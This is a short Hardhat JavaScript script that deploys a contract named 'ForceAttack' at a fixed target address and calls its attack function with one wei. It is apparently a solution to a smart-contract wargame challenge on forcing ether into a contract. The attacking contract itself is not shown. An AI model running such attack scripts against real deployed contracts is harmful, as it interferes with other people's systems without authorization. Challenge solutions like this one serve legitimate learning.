const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0xB42AED9768f053B5c1a0a53827C1578345F8CB2C";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("ForceAttack");
  const contract = await Contract.deploy(instanceAddress);

  // Attack

  await contract.attack({ value: 1 });
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
